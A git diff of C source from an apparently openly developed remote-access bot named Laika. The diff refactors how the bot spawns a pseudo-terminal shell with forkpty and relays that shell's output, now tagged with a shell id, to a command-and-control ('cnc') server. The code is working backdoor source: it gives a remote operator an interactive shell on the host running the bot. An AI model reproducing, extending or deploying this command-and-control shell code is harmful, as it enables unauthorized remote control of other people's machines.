@@ -16,15 +16,17 @@
 struct sLaika_shell {
     int pid;
     int fd;
+    uint32_t id;
 };
 
-struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows) {
+struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id) {
     struct winsize ws;
     struct sLaika_shell *shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
 
     ws.ws_col = cols;
     ws.ws_row = rows;
     shell->pid = forkpty(&shell->fd, NULL, NULL, &ws);
+    shell->id = id;
 
     if (shell->pid == 0) {
         /* child process, clone & run shell */
@@ -38,38 +40,34 @@ struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows)
         LAIKA_ERROR("Failed to set shell fd O_NONBLOCK");
     }
 
-    /* start shell task */
-    bot->shellTask = laikaT_newTask(&bot->tService, LAIKA_SHELL_TASK_DELTA, laikaB_shellTask, (void*)bot);
-
     return shell;
 }
 
-void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
+void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
     /* kill the shell */
     kill(shell->pid, SIGTERM);
     close(shell->fd);
 
-    /* tell cnc shell is closed */
-    laikaS_emptyOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
-
-    bot->shell = NULL;
     laikaM_free(shell);
-
-    /* stop shell task */
-    laikaT_delTask(&bot->tService, bot->shellTask);
-    bot->shellTask = NULL;
 }
 
+uint32_t laikaB_getShellID(struct sLaika_bot *bot, struct sLaika_shell *shell) {
+    return shell->id;
+}
+
+/* ============================================[[ Shell Handlers ]]============================================= */
+
 bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
-    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH];
+    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t)];
     struct sLaika_peer *peer = bot->peer;
     struct sLaika_socket *sock = &peer->sock;
 
-    int rd = read(shell->fd, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH);
+    int rd = read(shell->fd, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH-sizeof(uint32_t));
 
     if (rd > 0) {
         /* we read some input! send to cnc */
         laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+        laikaS_writeInt(sock, &shell->id, sizeof(uint32_t));
         laikaS_write(sock, readBuf, rd);
         laikaS_endVarPacket(peer);
     } else if (rd == -1) {
